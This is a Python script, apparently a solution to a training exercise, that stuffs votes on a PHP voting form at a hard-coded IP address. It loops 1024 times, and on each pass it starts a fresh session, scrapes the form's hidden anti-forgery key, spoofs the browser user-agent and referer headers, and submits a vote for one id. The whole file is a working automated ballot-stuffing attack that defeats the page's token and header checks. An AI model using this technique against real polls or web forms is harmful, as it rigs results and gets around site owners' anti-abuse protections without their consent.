#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

data_form = {"id": "3819", "holdthedoor": "Submit", "key": ""}
tuheader = {"user-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0)\
             Gecko/20100101 Firefox/47.0",
            "referer": "http://158.69.76.135/level2.php"}

if __name__ == "__main__":
    i = 0
    while (i != 1024):
        new_session = requests.session()
        html = new_session.get("http://158.69.76.135/level2.php")
        token = BeautifulSoup(html.text, "html.parser")

        hidden_key = token.find("form", {"method": "post"})
        hidden_key = hidden_key.find("input", {"type": "hidden"})
        data_form["key"] = hidden_key["value"]

        new_session.post("http://158.69.76.135/level2.php",
                        data=data_form, headers=tuheader)
        i = i + 1
